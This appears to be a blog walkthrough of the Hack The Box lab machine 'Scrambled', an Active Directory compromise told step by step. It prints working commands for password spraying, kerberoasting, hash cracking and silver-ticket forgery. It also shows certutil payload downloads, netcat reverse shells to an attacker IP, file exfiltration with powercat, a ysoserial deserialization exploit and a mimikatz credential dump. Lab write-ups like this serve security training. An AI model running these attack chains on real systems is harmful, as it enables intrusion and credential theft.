---
title: "Hack the Box - Scrambled"
slug: "hack-the-box-scrambled"
date: "2024-03-14"
excerpt: "Scrambled is a medium Windows Active Directory machine. Enumerating the website hosted on the remote machine a potential attacker is able to deduce the credentials for the user `ksimpson`. On the website, it is also stated that NTLM authentication is disabled meaning that Kerberos authentication is to be used. Accessing the `Public` share with the credentials of `ksimpson`, a PDF file states that an attacker retrieved the credentials of an SQL database. This is a hint that there is an SQL service running on the remote machine. Enumerating the normal user accounts, it is found that the account `SqlSvc` has a `Service Principal Name` (SPN) associated with it. An attacker can use this information to perform an attack known as `kerberoasting` and get the hash of `SqlSvc`. After cracking the hash and acquiring the credentials for the `SqlSvc` account an attacker can perform a `silver ticket` attack to forge a ticket and impersonate the user `Administrator` on the remote MSSQL service. Enumeration of the database reveals the credentials for user `MiscSvc`, which can be used to execute code on the remote machine using PowerShell remoting. System enumeration as the new user reveals a `.NET` application, which is listening on port `4411`. Reverse engineering the application reveals that it is using the insecure `Binary Formatter` class to transmit data, allowing the attacker to upload their own payload and get code execution as `NT AUTHORITY/SYSTEM`."
cover: "cover.png"
tags:
  - MSSQL
  - Kerberoast
  - Reverse Engineering
---

## Enumeration
### NMAP
```bash
nmap -sC -sV -v -T4 -oN scans/nmap.txt scrambled.htb
```

```text
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-07-18 06:21:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
```

NMAP scan reveals the machine's hostname and domain. From the NMAP scan we can also identify a `MSSQL` database on port `1433`.

![](evidence/screenshots/20220718163542.png)  

### Website

Website has 2 working main pages, `Home` and `IT Services`.

![](evidence/screenshots/20220718163723.png)  

The `IT Services` page has an alert and some other interesting pages.

![](evidence/screenshots/20220718163945.png)  

### Sales Order App

On the `Report a problem with the sales orders app` page there's a screenshot with port `4411`. We can use `netcat` to check it out.

```bash
nc -v scrm.htb 4411
```

![](evidence/screenshots/20220718164359.png)  

## Credentials - ksimpson

We can use `kerbrute` to enumerate domain usernames. We already know the format of the username based on one of the screenshots. Don't forget to add `scrm.local` to `/etc/hosts` so the domain resolves.

![](evidence/screenshots/20220718210426.png)  

I'm using [this](https://github.com/attackdebris/kerberos_enum_userlists) kerberos user wordlist.

```bash
kerbrute userenum -d scrm.local --dc scrm.local /usr/share/wordlists/kerberos/A-ZSurnames.txt
```

We got 5 valid usernames back. We can try low hanging fruit by password spraying.

![](evidence/screenshots/20220718213505.png)  

```bash
kerbrute passwordspray -d scrm.local --dc scrm.local valid_usernames.txt 'ksimpson' 
```

Since the website said password's are reset to the same as your username we can try that first.

![](evidence/screenshots/20220718214142.png)  

Now that we have valid credentials we can request a ticket and authenticate via `Kerberos`.

```bash
impacket-getTGT scrm.local/ksimpson:ksimpson
export KRB5CCNAME=ksimpson.ccache
```

### SMB

We can use `impacket-smbclient` to enumerate the target's file shares. If we look at the `Public` directory there's a `Network Security Changes.pdf` file. We can download it using `get`.

```bash
impacket-smbclient scrm.local/ksimpson@dc1.scrm.local -k -no-pass
```

![](evidence/screenshots/20220722123949.png)  

From the `PDF` we now know `NTLM` authentication is disabled and only leaves us with `Kerberos`.

Also this is untrue 😉 as we will soon find out
> (which is definitely 100% secure and has absolutely no way anyone could exploit it)

![](evidence/screenshots/20220722124041.png)  

## Shell as MSSQLSVC

### Service Principal Names

We'll start by dumping user encrypted kerberos TGS's.

```bash
impacket-GetUserSPNs -request scrm.local/ksimpson -dc-ip dc1.scrm.local -k -no-pass -outputfile hashes.kerberoast
```

We get an error `exceptions must derive from BaseException`. If we do some googling we find a [Github issue](https://github.com/SecureAuthCorp/impacket/issues/1206) relating to this problem. It looks like at the time of doing this machine the issue has been resolved. We can download the new `GetUserSPNs.py` file and replace our existing one.

```bash
cd /usr/share/doc/python3-impacket/examples
sudo rm getUserSPNs.py
sudo wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py
```

We can change `-dc-ip` to `-dc-host` and it should now work.

```bash
impacket-GetUserSPNs -request scrm.local/ksimpson -dc-host dc1.scrm.local -k -no-pass -outputfile hashes.kerberoast
```

![](evidence/screenshots/20220722125837.png)  

### Cracking Password

We now have the hash for the `sqlsvc` service account. Save the hash to a file and then crack using `hashcat`.

```bash
hashcat -m 13100 --force -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt
```

We get the password `Pegasus60`.

![](evidence/screenshots/20220722122907.png)  

We'll end up using the NTLM hash of the password we can use the following `python` snippet.

```bash
python -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "Pegasus60".encode("utf-16le")).digest()))'
```

```text
b999a16500b87d17ec7f2e2a68778f05:Pegasus60
```

We can get the Domain SID by using `secretsdump` in debug mode `S-1-5-21-2743207045-1827831105-2542523200`.

```bash
impacket-secretsdump scrm.local/ksimpson@dc1.scrm.local -k -no-pass -debug 
```

![](evidence/screenshots/20220722230825.png)  

### Golden Ticket

Finally we can create our `Golden Ticket` using `ticketer`.

```bash
impacket-ticketer -domain scrm.local -spn MSSQLSVC/dc1.scrm.local -user-id 500 Administrator -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200
```

![](evidence/screenshots/20220722231404.png)  

```bash
export KRB5CCNAME=Administrator.ccache
```

Now we can use `mssqlclient`.

### MSSQL

```bash
impacket-mssqlclient dc1.scrm.local -k -no-pass
```

![](evidence/screenshots/20220722231453.png)  

Let's go through the database.

```sql
SELECT name FROM master.dbo.sysdatabases;
USE ScrambleHR;
SELECT * FROM INFORMATION_SCHEMA.TABLES;
SELECT * FROM UserImport;
```

![](evidence/screenshots/20220722231710.png)  

We are able to get credentials, `MiscSvc:ScrambledEggs9900`.

We're able to get command execution via `xp_cmdshell`.

```sql
enable_xp_cmdshell
xp_cmdshell whoami
```

![](evidence/screenshots/20220722231945.png)  

First let's upload `netcat` to the target using `certutil`. Start by starting a simple python web server.

```bash
cp /usr/share/windows-binaries/nc.exe ./
python3 -m http.server 80
```

Then using `xp_cmdshell` we can upload the file.

```powershell
xp_cmdshell certutil -urlcache -split -f http://10.10.16.14/nc.exe c:\windows\temp\nc.exe
```

Then start a reverse shell listener.
```bash
rlwrap nc -lnvp 9001
```

Execute the following payload to get our reverse shell.

```powershell
xp_cmdshell c:\windows\temp\nc.exe 10.10.16.14 9001 -e powershell.exe
```

And we get our shell!

![](evidence/screenshots/20220722232518.png)  

## Shell as MiscSvc

### Find Credentials - MiscSvc

Using the credentials we found in the database we can execute commands as the `MiscSvc` user using `Invoke-Command`.

```powershell
$pass = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Scrm\MiscSvc', $pass)
Invoke-Command -Computer dc1 -Credential $cred -Command { whoami }
```

### Shell

As we can see, we're now able to execute commands as the `MiscSvc` user.

![](evidence/screenshots/20220722232953.png)  

Let's get another shell as this user. We first need to move `nc.exe` to another folder that `MiscSvc` can access. After trying to execute `nc.exe` from that user we get `Access Denied`.

```powershell
cp c:\windows\temp\nc.exe c:\temp\nc.exe
```

Start another `netcat` listener using a different port.

```bash
rlwrap nc -lnvp 9002
```

```powershell
Invoke-Command -Computer dc1 -Credential $cred -Command { cmd /c c:\temp\nc.exe 10.10.16.14 9002 -e powershell.exe }
```

And we get our shell.

![](evidence/screenshots/20220722233934.png)  

In the `Shares/IT/Apps/Sales Order Client` there's the client application shown on the website.

![](evidence/screenshots/20220723095638.png)  

## Shell as SYSTEM

### Exfiltrate ScrableClient

To exfiltrate these files we'll use `powercat` since we aren't able to use SMB because NTLM authentication is disabled.

```bash
wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
python3 -m http.server 80
```

```powershell
certutil -urlcache -split -f http://10.10.16.14/powercat.ps1 powercat.ps1
Import-Module .\powercat.ps1
```

Then start a `netcat` listener on our machine.

```bash
nc -lnvp 9003 > ScrableClient.exe
```

Now we can exfiltrate the file. Do the same for `ScrambleClient.exe` and `ScrambleLib.exe`.

```powershell
powercat -c 10.10.16.14 -p 9003 -i "c:\shares\it\apps\sales order client\ScrambleClient.exe"
```

The connection won't automatically terminate once the file is transferred so you will have to cancel it manually on the host side, I'd wait 5-10 seconds to make sure the file has transferred fully, or check the size of the output compared to the input.

You should be able to open and run the executable.

![](evidence/screenshots/20220723103944.png)  

### Source Code Analysis

Now we can analyse these files. I'll be using [JetBrains dotPeek](https://www.jetbrains.com/decompiler/) since I'm most familiar with it.

Open both the executable and link library in `dotPeek` to start examining how it works.

![](evidence/screenshots/20220723104037.png)  

Under `ScrambleClient` and `ScrambleLib` there should be some methods.

![](evidence/screenshots/20220723104247.png)  
![](evidence/screenshots/20220723104257.png)  

In the `ScrableNetClient` method within the `ScrambleLib.dll` file, there's a particularly interesting function called `UploadOrder` which uses serialisation 

![](evidence/screenshots/20220723105117.png)  

```csharp
public void UploadOrder(SalesOrder NewOrder)
{
  try
  {
    Log.Write("Uploading new order with reference " + NewOrder.ReferenceNumber);
    string base64 = NewOrder.SerializeToBase64();
    Log.Write("Order serialized to base64: " + base64);
    ScrambleNetResponse response = this.SendRequestAndGetResponse(new ScrambleNetRequest(ScrambleNetRequest.RequestType.UploadOrder, base64));
    if (response.Type != ScrambleNetResponse.ResponseType.Success)
      throw new ApplicationException(response.GetErrorDescription());
    Log.Write("Upload successful");
  }
  catch (Exception ex)
  {
    ProjectData.SetProjectError(ex);
    Exception exception = ex;
    Log.Write("Error: " + exception.Message);
    throw exception;
  }
}
```

### ysoserial

This function is using unsafe deserialisation which we are able to use as an attack vector. We can use the tool [ysoserial](https://github.com/pwntester/ysoserial.net) to generate our malicious payload.

First [download](https://github.com/pwntester/ysoserial.net/releases/download/v1.34/ysoserial-1.34.zip) and extract the executable.

Then using `powershell` or `cmd` execute the following command to generate our payload.

```powershell
.\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "c:\temp\nc.exe 10.10.16.14 9008 -e powershell.exe"
```

![](evidence/screenshots/20220723215724.png)  

We can use `netcat` to connect back to port `4411` and execute our payload.

```bash
nc scrm.local 4411
```

```bash
UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2Vj...
```

![](evidence/screenshots/20220723220147.png)  

And we get shell as `SYSTEM`!

![](evidence/screenshots/20220723220024.png)  

## Dumping Hashes

I initially retrieves the system hashes by changing the Administrator's password. I only realised afterwards (thanks hindsight) that changing the Administrator password was dumb and I should've used `mimikatz` instead to dump hashes because now we don't have the original Administrator hash, not to mention it's not a great idea for an actual engagement.

So instead let's upload `mimikatz.exe` and dump the Administrators NTLM hash.

```bash
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./
python3 -m http.server 80
```

Then upload it to the target.

```powershell
certutil -urlcache -split -f http://10.10.16.14/mimikatz.exe c:\temp\mimikatz.exe
.\mimikatz.exe
```

Now we can retreive the Administrators NTLM hash.

```bash
privilege::debug
lsadump::lsa /inject /name:Administrator
```

![](evidence/screenshots/20220724145902.png)  

Using the NTLM hash we are able to perform an Overpass the Hash attack. First we need to generate our TGT.

```bash
impacket-getTGT scrm.local/Administrator -dc-ip dc1.scrm.local -hashes :e2bba07a8348bca150ac6ffee6a3afbb
export KRB5CCNAME=Administrator.ccache
```

Now we are able to use authenticate as Administrator and can use tools like `psexec` to get a shell on the target.

```bash
impacket-psexec scrm.local/Administrator@dc1.scrm.local -k -no-pass
```

![](evidence/screenshots/20220724150143.png)  

Now that we know this all works, we can retreive the target's hashes using `secretsdump`.

```bash
impacket-secretsdump scrm.local/Administrator@dc1.scrm.local -k -no-pass -outputfile hashes/hashes
```

![](evidence/screenshots/20220724150300.png)  